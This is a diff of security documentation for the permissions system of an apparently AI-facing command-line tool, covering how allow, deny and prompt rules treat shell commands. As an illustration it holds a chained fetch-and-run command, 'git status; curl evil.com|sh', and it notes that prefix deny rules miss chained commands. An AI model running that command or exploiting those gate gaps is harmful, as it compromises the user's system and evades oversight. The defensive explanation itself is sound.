@@ -104,8 +104,12 @@ wildcard like `read:*` above is the practical `allow` grant shape there —
 either shape (`bash:cargo test` or `bash:*`).** `allow` — a durable,
 remembered pattern grant — does not exist for `bash` (or any tool whose
 rendering is a shell command) at all: writing `"allow": ["bash:cargo
-test"]` parses without error and the entry appears in the file, but it
-never authorizes anything, ever, for any `bash` call, chained or not —
+test"]` parses without error and the entry appears in the file — and, at
+session start (or on `/trust permissions`), a transcript notice tells you
+so: it names the rule and states that it selects a `ShellCommand`-rendering
+tool and will never authorize anything (see "The structured `rules` array",
+below, for the exact wording and why it is a notice, not a hard error) — but
+it never authorizes anything, ever, for any `bash` call, chained or not —
 see Limits for why. `deny`/`prompt` entries for `bash` are unaffected and
 work exactly as written (`"bash:curl"` above still refuses every `curl`
 call, chained or not — deny is *harder* to evade than a plain prefix
@@ -290,28 +294,36 @@ shape, not just a single named tool:
   members), and it is NOT installed silently (the inert `Structured` members
   would hide). The loader installs the rule and surfaces a notice naming the
   inert `Structured` members, so the operator can split the rule if they
-  meant them to match. **For `then: "allow"`, this notice is misleading in
-  one respect: it names the `Structured` members as the inert ones, but the
-  `ShellCommand` members are ALSO inert now** (see below) — the notice
-  predates that change and the registration check does not yet distinguish
-  the two, so an `allow` rule selecting `["bash", "read"]` installs with a
-  notice about `bash` (correctly: it never matches for an unrelated,
-  pre-existing reason too — see immediately below) but authorizes nothing
-  for either tool through this path. Unknown tools (a name no registered
-  tool answers to, e.g. a plugin tool loaded later) are skipped, not
-  errored — a load-order hazard is not a misconfigured rule.
+  meant them to match. **For `then: "allow"`, the SAME notice now also names
+  the `ShellCommand` members as inert** (board item
+  `01M03222QS0WQWPEHHNP9FKVXJ`) — an `allow` rule selecting
+  `["bash", "read"]` installs with one notice naming BOTH members as
+  never-matching, for two unrelated reasons (`read`'s JSON-dump token
+  boundaries; `bash`'s render kind refusing every allow grant outright, see
+  immediately below) — and authorizes nothing for either tool. Unknown tools
+  (a name no registered tool answers to, e.g. a plugin tool loaded later) are
+  skipped, not errored — a load-order hazard is not a misconfigured rule.
 
-**`allow` paired with a `ShellCommand` tool (`bash`) installs without any
-registration error or notice, and never matches, for any `select`/`when`
-shape.** This is different from the `Structured` case above, which the
-loader detects and reports at load time: there is currently no registration
-diagnostic for "this `allow` rule selects a shell-rendered tool and will
-never authorize anything." Nothing about this is a fail-*open* gap — the
-call is still refused, exactly as if no rule existed at all, by the same
-mechanism described in Limits — but it is a discoverability gap: a `bash`
-`allow` rule sits in your file looking like it does something. Prefer
-`deny`/`prompt` for `bash`, or drop the `allow` entry and grant per-call
-(`[y]`/`[a]`) or per-directory (`--root`) instead.
+**`allow` paired with a `ShellCommand` tool (`bash`) never matches, for any
+`select`/`when` shape — and, as of board item `01M03222QS0WQWPEHHNP9FKVXJ`,
+this is no longer silent.** `command_prefix` and `always` (the two `allow`-
+reachable `when` shapes) now surface a registration NOTICE — not a hard
+registration error — naming the inert `ShellCommand` member(s), the same
+channel the `Structured` case above uses (operator-visible at startup and on
+`/trust permissions`). This closes the discoverability gap the previous
+revision of this page recorded: a `bash` `allow` rule used to sit in your
+file looking like it does something, with nothing telling you otherwise.
+**Why a notice and not a hard registration error, unlike the all-`Structured`
+case above:** first, a hard reject would break every *existing*
+`permissions.json` carrying a `bash:...` allow entry — a real migration cost
+for a rule that was already matching nothing either way, for zero additional
+protection. Second, unlike the all-`Structured` case (which has no working
+member to preserve), a mixed `["bash", "read"]` select still has a working
+`Structured` half worth keeping installed. Nothing about either the notice
+or its absence is a fail-*open* gap either way — the call is still refused,
+exactly as if no rule existed at all, by the same mechanism described in
+Limits. Prefer `deny`/`prompt` for `bash`, or drop the `allow` entry and
+grant per-call (`[y]`/`[a]`) or per-directory (`--root`) instead.
 
 **The `allow`/`deny` asymmetry, explained, not merely stated:**
 
@@ -557,15 +569,45 @@ does:
   this same scan). The fix is not a better scan; it is that a durable
   pattern grant no longer exists for a shell-rendered tool, full stop. An
   `allow` rule naming `bash` — `bash:git status`, `bash:*`, or the
-  structured equivalent — installs without error but authorizes **nothing**,
-  for **any** command, chained or not (see "Rules in `permissions.json`"
-  above). What is left for `bash`: allow it once (`[y]`), grant the exact
-  call (`[a]`), deny or prompt on it (`deny`/`prompt` rules are unaffected
-  and still match by literal prefix, chained commands included, in either
-  direction described below), or confine what it can reach with `--root`.
-  `read`/`write`/`grep`/… and every other `Structured`-rendering tool are
-  unaffected — their `allow` pattern grants work exactly as this page
-  describes, because no shell is ever involved in running one.
+  structured equivalent — installs (with a notice — see "Rules in
+  `permissions.json`" above) but authorizes **nothing**, for **any** command,
+  chained or not. What is left for `bash`: allow it once (`[y]`), grant the
+  exact call (`[a]`), deny or prompt on it (`deny`/`prompt` rules are
+  unaffected and still match by literal prefix, chained commands included, in
+  either direction described below), or confine what it can reach with
+  `--root`. `read`/`write`/`grep`/… and every other `Structured`-rendering
+  tool are unaffected — their `allow` pattern grants work exactly as this
+  page describes, because no shell is ever involved in running one.
+- **The one-shot `-p`/`--allowed-tools` gate is a DIFFERENT mechanism, and it
+  still scans a command's text for shell metacharacters — deliberately, not
+  as an oversight.** Everything above this bullet describes `permissions.json`
+  and the interactive prompt's durable/session pattern grants
+  (`conway_runtime::permission::PermissionBroker`); one-shot mode
+  (`conway -p ...`) never touches that broker at all — it builds a
+  `conway::gates::AllowListGate` straight from `--allowed-tools`/
+  `--deny-tools` instead (see [`scripting.md`](scripting.md) for the flag
+  syntax). A `tool_name(arg_glob)` entry there (e.g. `bash(git *)`) still
+  refuses a `ShellCommand` call whose rendered command carries a shell
+  metacharacter, even though the durable mechanism's identical scan was
+  removed above. This was examined on purpose (board item
+  `01M03222QS0WQWPEHHNP9FKVXJ`) and kept, not overlooked: removing it would
+  **widen** what a scoped grant authorizes — a raw glob's `*` matches a
+  metacharacter too, so `bash(git *)` would silently start authorizing
+  `git status; curl evil.com|sh` the moment the scan is gone, the identical
+  hazard the durable gate's own former version protected against. It does
+  occasionally refuse a call the operator's own glob would otherwise cover
+  (e.g. `bash(git *)` refuses `git log | head` even though `git *` matches
+  that string), the same shape of false positive an internal measurement
+  against this repository's own logged commands put at 68% — kept
+  anyway because the consequence differs from what made that rate
+  intolerable: this is a one-shot invocation with no persisted rule to endure
+  months of false positives against, the person inconvenienced is the same
+  person who typed the grant in the same breath, and a friction-free escape
+  hatch exists (the *bare* `tool_name` form, e.g. `--allowed-tools bash`
+  with no parens, is never gated by this scan at all — see
+  [`scripting.md`](scripting.md)'s "Scoping an entry to specific arguments").
+  See `conway::gates::AllowListGate`'s own rustdoc (`ArgMatcher::allows`) for
+  the full reasoning.
 - **Deny-by-prefix is a seatbelt, not a boundary.** A `deny` rule matches a
   literal prefix of the rendered command. `deny bash:git push` does **not**
   catch `foo; git push` — the rule never claimed to parse shell, and a
